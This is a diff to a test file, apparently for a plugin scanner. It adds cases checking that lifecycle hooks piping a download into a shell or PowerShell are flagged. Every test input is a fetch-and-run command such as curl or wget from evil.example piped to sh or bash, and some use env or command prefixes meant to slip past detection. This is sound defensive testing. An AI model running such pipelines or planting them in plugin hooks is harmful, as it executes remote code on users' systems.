@@ -262,7 +262,11 @@ describe("plugin lifecycle hooks", () => {
     "curl https://evil.example/install.sh | /bin/sh",
     "env SAFE=1 curl https://evil.example/install.sh | sh",
     "command wget https://evil.example/install.sh | bash",
-    "env SAFE=1 iwr https://evil.example/install.ps1 | iex"
+    "env SAFE=1 iwr https://evil.example/install.ps1 | iex",
+    "env -i curl https://evil.example/install.sh | sh",
+    "env -- curl https://evil.example/install.sh | sh",
+    "command -p wget https://evil.example/install.sh | bash",
+    "env SAFE=1 command curl https://evil.example/install.sh | sh"
   ])("flags downloader-to-interpreter hook pipelines: %s", async (command) => {
     const rootPath = await createPlugin(hookConfig(command));
 
